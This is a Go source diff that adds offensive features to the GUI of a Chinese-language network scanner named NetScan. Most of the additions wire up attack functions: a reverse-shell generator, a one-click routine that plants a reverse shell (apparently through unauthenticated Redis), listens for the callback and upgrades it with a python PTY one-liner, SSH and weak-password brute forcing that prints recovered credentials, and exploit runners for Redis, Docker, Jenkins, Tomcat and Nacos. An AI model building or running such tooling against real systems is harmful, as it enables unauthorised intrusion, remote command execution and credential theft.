@@ -6,6 +6,7 @@ import (
 	"fmt"
 	"net"
 	"os"
+	"os/exec"
 	"path/filepath"
 	"strconv"
 	"strings"
@@ -50,6 +51,9 @@ type scanRequest struct {
 
 // Run 启动基于 WebView 的图形界面
 func Run() {
+	// 加载用户自定义模块(modules/ 目录)
+	scanner.OpenModuleManager("").Load()
+
 	w := webview.New(false)
 	defer w.Destroy()
 	w.SetTitle("NetScan 网络扫描器")
@@ -72,6 +76,15 @@ func Run() {
 	}
 	recon := func(line string) {
 		dispatchJS("window.addRecon(" + strconv.Quote(line) + ")")
+	}
+	recon2 := func(line string) {
+		dispatchJS("window.addExploitRecon(" + strconv.Quote(line) + ")")
+	}
+	// 交互式 shell 会话(纯 GUI 内嵌终端)
+	var shellMu sync.Mutex
+	var shellConn net.Conn
+	shellOut := func(line string) {
+		dispatchJS("window.addShellOut(" + strconv.Quote(line) + ")")
 	}
 	go func() {
 		t := time.NewTicker(50 * time.Millisecond)
@@ -152,6 +165,22 @@ func Run() {
 				}
 				recon("========== Banner 完成 ==========")
 			}
+
+			// 插件: notification 推送 / report 生成报告 / output 自定义输出
+			resultMu.Lock()
+			rs := make([]scanner.Result, len(collected))
+			copy(rs, collected)
+			target := lastTarget
+			ports := lastPorts
+			resultMu.Unlock()
+			pm := scanner.OpenPluginManager("")
+			pm.Notify(rs)
+			for _, path := range pm.GenerateReports(target, ports, rs) {
+				recon("插件报告已生成: " + path)
+			}
+			for name, text := range pm.RenderOutput(rs) {
+				recon("===== 插件输出: " + name + " =====\n" + text)
+			}
 		}()
 
 		// Web 侦察
@@ -225,8 +254,318 @@ func Run() {
 		return path, nil
 	})
 
+	// 反弹 shell 生成
+	w.Bind("shellGen", func(shellType, lhost string, lport int) string {
+		return scanner.ReverseShell(shellType, lhost, lport)
+	})
+
+	// 漏洞报告
+	w.Bind("vulnReport", func() string {
+		return scanner.VulnReport()
+	})
+
+	// 一键拿 shell: 检测未授权→写反弹 shell→监听→内嵌终端交互
+	w.Bind("getShell", func(target, lhost string, lport, port int) error {
+		go func() {
+			ip, err := resolveHost(target)
+			if err != nil {
+				shellOut("无法解析 " + target + "\n")
+				return
+			}
+			if lhost == "" {
+				shellOut("请填写回连地址(lhost)\n")
+				return
+			}
+			if port <= 0 {
+				port = 6379
+			}
+			ln, err := net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", lport))
+			if err != nil {
+				shellOut("监听失败: " + err.Error() + "\n")
+				return
+			}
+			defer ln.Close()
+			shellOut(fmt.Sprintf("========== 一键拿 shell %s:%d (监听 %d) ==========\n", ip, port, lport))
+
+			result := scanner.GetShell(ip, port, lhost, lport, 5*time.Second)
+			shellOut(result + "\n")
+			if strings.HasPrefix(result, "目标") || strings.HasPrefix(result, "写入失败") || strings.HasPrefix(result, "连接失败") || strings.HasPrefix(result, "端口") || strings.HasPrefix(result, "检测未命中") || strings.HasPrefix(result, "不可") {
+				shellOut("========== 拿 shell 失败 ==========\n")
+				return
+			}
+
+			ln.(*net.TCPListener).SetDeadline(time.Now().Add(60 * time.Second))
+			conn, err := ln.Accept()
+			if err != nil {
+				shellOut("60 秒内未收到 shell 连接\n")
+				return
+			}
+
+			// 关闭旧会话, 保存新连接
+			shellMu.Lock()
+			if shellConn != nil {
+				_ = shellConn.Close()
+			}
+			shellConn = conn
+			shellMu.Unlock()
+
+			shellOut("[+] 收到反弹 shell: " + conn.RemoteAddr().String() + "\n")
+			// 自动升级 PTY: 让远端 bash 获得 job control, 可运行 vim/top/sudo 等
+			_, _ = conn.Write([]byte("python3 -c 'import pty;pty.spawn(\"/bin/bash\")' 2>/dev/null || python -c 'import pty;pty.spawn(\"/bin/bash\")' 2>/dev/null || script -qc /bin/bash /dev/null 2>/dev/null\n"))
+
+			// 持续读取 shell 输出推送到内嵌终端
+			buf := make([]byte, 4096)
+			for {
+				n, err := conn.Read(buf)
+				if n > 0 {
+					shellOut(string(buf[:n]))
+				}
+				if err != nil {
+					break
+				}
+			}
+			shellOut("\n[*] shell 已断开\n")
+			shellMu.Lock()
+			if shellConn == conn {
+				shellConn = nil
+			}
+			shellMu.Unlock()
+			_ = conn.Close()
+		}()
+		return nil
+	})
+
+	// 交互式 shell: 发送命令 / 断开连接
+	w.Bind("shellInput", func(cmd string) {
+		shellMu.Lock()
+		c := shellConn
+		shellMu.Unlock()
+		if c == nil {
+			shellOut("未连接 shell\n")
+			return
+		}
+		_, _ = c.Write([]byte(cmd + "\n"))
+	})
+	w.Bind("shellClose", func() {
+		shellMu.Lock()
+		c := shellConn
+		shellConn = nil
+		shellMu.Unlock()
+		if c != nil {
+			_ = c.Close()
+		}
+	})
+
+	// 扫描目标所有漏洞(仅命中)
+	w.Bind("scanVuln", func(target string, port int) error {
+		go func() {
+			ip, err := resolveHost(target)
+			if err != nil {
+				recon2("无法解析 " + target)
+				return
+			}
+			if port <= 0 {
+				port = 80
+			}
+			recon2(fmt.Sprintf("========== 扫描漏洞 %s:%d ==========", ip, port))
+			hits := scanner.ScanVulns(ip, port, 3*time.Second)
+			if len(hits) == 0 {
+				recon2("未发现漏洞")
+			} else {
+				recon2(fmt.Sprintf("命中 %d 个漏洞:", len(hits)))
+				for _, h := range hits {
+					recon2(fmt.Sprintf("● %s\n  复现: %s", h.Name, h.Steps))
+				}
+			}
+			recon2("========== 漏洞扫描完成 ==========")
+		}()
+		return nil
+	})
+
+	// 扫描 Web POC 模板
+	w.Bind("pocScan", func(target string, port int) error {
+		go func() {
+			ip, err := resolveHost(target)
+			if err != nil {
+				recon2("无法解析 " + target)
+				return
+			}
+			if port <= 0 {
+				port = 80
+			}
+			recon2(fmt.Sprintf("========== 扫描 Web POC %s:%d ==========", ip, port))
+			hits := scanner.ScanPOCs(ip, port, 3*time.Second)
+			if len(hits) == 0 {
+				recon2("未命中任何 POC")
+			} else {
+				recon2(fmt.Sprintf("命中 %d 个 POC:", len(hits)))
+				for _, h := range hits {
+					recon2(fmt.Sprintf("● %s\n  复现: %s", h.Name, h.Steps))
+				}
+			}
+			recon2("========== POC 扫描完成 ==========")
+		}()
+		return nil
+	})
+
+	// SSH 爆破 + 弹交互式命令行窗口
+	w.Bind("sshShell", func(target string, port int) error {
+		go func() {
+			ip, err := resolveHost(target)
+			if err != nil {
+				recon2("无法解析 " + target)
+				return
+			}
+			if port <= 0 {
+				port = 22
+			}
+			recon2(fmt.Sprintf("========== SSH 爆破 %s:%d ==========", ip, port))
+			user, pass, ok := scanner.BruteSSHOnce(ip, port, nil, nil, 10, 3*time.Second)
+			if !ok {
+				recon2("爆破失败, 未找到凭据")
+				return
+			}
+			recon2(fmt.Sprintf("[成功] %s:%d  用户:%s 密码:%s", ip, port, user, pass))
+			// 弹新命令行窗口运行交互式 SSH
+			exe, _ := os.Executable()
+			cmd := exec.Command("cmd", "/c", "start", "NetScan-SSH", exe,
+				"--ssh-connect", "-target", ip, "-p", strconv.Itoa(port),
+				"--ssh-user", user, "--ssh-pass", pass)
+			if err := cmd.Start(); err != nil {
+				recon2("弹出命令行失败: " + err.Error())
+				return
+			}
+			recon2("已弹出交互式 SSH 命令行窗口")
+		}()
+		return nil
+	})
+
+	// 弱口令爆破
+	w.Bind("brute", func(target string, port int, service string, threads, delay int) error {
+		go func() {
+			ip, err := resolveHost(target)
+			if err != nil {
+				recon2("无法解析 " + target)
+				return
+			}
+			if port <= 0 {
+				port = defaultPort(service)
+			}
+			recon2(fmt.Sprintf("========== 爆破 %s %s:%d ==========", service, ip, port))
+			scanner.BruteForce(ip, port, service, nil, nil, threads, time.Duration(delay)*time.Millisecond, 3*time.Second, func(r scanner.BruteResult) {
+				recon2(fmt.Sprintf("[成功] %s://%s:%d  用户:%s 密码:%s", r.Service, ip, port, r.Username, r.Password))
+			})
+			recon2("========== 爆破完成 ==========")
+		}()
+		return nil
+	})
+
+	// 漏洞利用
+	w.Bind("exploit", func(name, target string, port int) error {
+		go func() {
+			ip, err := resolveHost(target)
+			if err != nil {
+				recon2("无法解析 " + target)
+				return
+			}
+			if port <= 0 {
+				port = defaultPort(name)
+			}
+			recon2(fmt.Sprintf("========== 利用 %s %s:%d ==========", name, ip, port))
+			if name == "auto" {
+				recon2(scanner.AutoExploit(ip, port, "", 5*time.Second))
+			} else {
+				recon2(scanner.RunExploit(name, ip, port, 5*time.Second))
+			}
+			recon2("========== 利用完成 ==========")
+		}()
+		return nil
+	})
+
+	// 查看资产历史
+	w.Bind("history", func(target string) string {
+		s := scanner.OpenStore(scanner.DefaultStateDir())
+		recs, err := s.History(target)
+		if err != nil {
+			return "无历史记录"
+		}
+		var sb strings.Builder
+		for _, rec := range recs {
+			sb.WriteString("=== " + rec.Target + " (" + rec.Time.Format("2006-01-02 15:04:05") + ") ===\n")
+			for _, a := range rec.Assets {
+				sb.WriteString(fmt.Sprintf("  %s:%-5d/%-3s %s\n", a.IP, a.Port, a.Protocol, a.Service))
+			}
+		}
+		return sb.String()
+	})
+
+	// 保存到资产库
+	w.Bind("storeScan", func(target string) string {
+		resultMu.Lock()
+		rs := make([]scanner.Result, len(collected))
+		copy(rs, collected)
+		resultMu.Unlock()
+		s := scanner.OpenStore(scanner.DefaultStateDir())
+		if err := s.Save(target, rs); err != nil {
+			return "保存失败: " + err.Error()
+		}
+		return "已保存到资产库"
+	})
+
+	// ---- 插件管理 ----
+	pm := scanner.OpenPluginManager(scanner.DefaultPluginDir())
+	w.Bind("getPlugins", func() (string, error) {
+		b, _ := json.Marshal(pm.List())
+		return string(b), nil
+	})
+	w.Bind("getMarketPlugins", func() (string, error) {
+		b, _ := json.Marshal(scanner.MarketplacePlugins())
+		return string(b), nil
+	})
+	w.Bind("installMarketPlugin", func(id string) error {
+		return scanner.InstallMarketPlugin(id)
+	})
+	w.Bind("installFilePlugin", func(path string) error {
+		return pm.Install(path)
+	})
+	w.Bind("enablePlugin", func(id string) error { return pm.Enable(id) })
+	w.Bind("disablePlugin", func(id string) error { return pm.Disable(id) })
+	w.Bind("uninstallPlugin", func(id string) error { return pm.Remove(id) })
+	w.Bind("updatePlugin", func(id string) error { return scanner.InstallMarketPlugin(id) })
+
 	w.SetHtml(indexHTML)
 	w.Run()
+}
+
+// defaultPort 根据服务/模块名返回默认端口
+func defaultPort(name string) int {
+	switch strings.ToLower(name) {
+	case "ftp":
+		return 21
+	case "ssh":
+		return 22
+	case "telnet":
+		return 23
+	case "smtp":
+		return 25
+	case "mysql":
+		return 3306
+	case "postgresql":
+		return 5432
+	case "redis", "redis-write-shell":
+		return 6379
+	case "docker", "docker-escape":
+		return 2375
+	case "elasticsearch", "es-file-read":
+		return 9200
+	case "nacos", "nacos-register":
+		return 8848
+	case "jenkins", "jenkins-script":
+		return 8080
+	case "tomcat", "tomcat-war":
+		return 8080
+	}
+	return 80
 }
 
 func buildOptions(req scanRequest) scanner.Options {
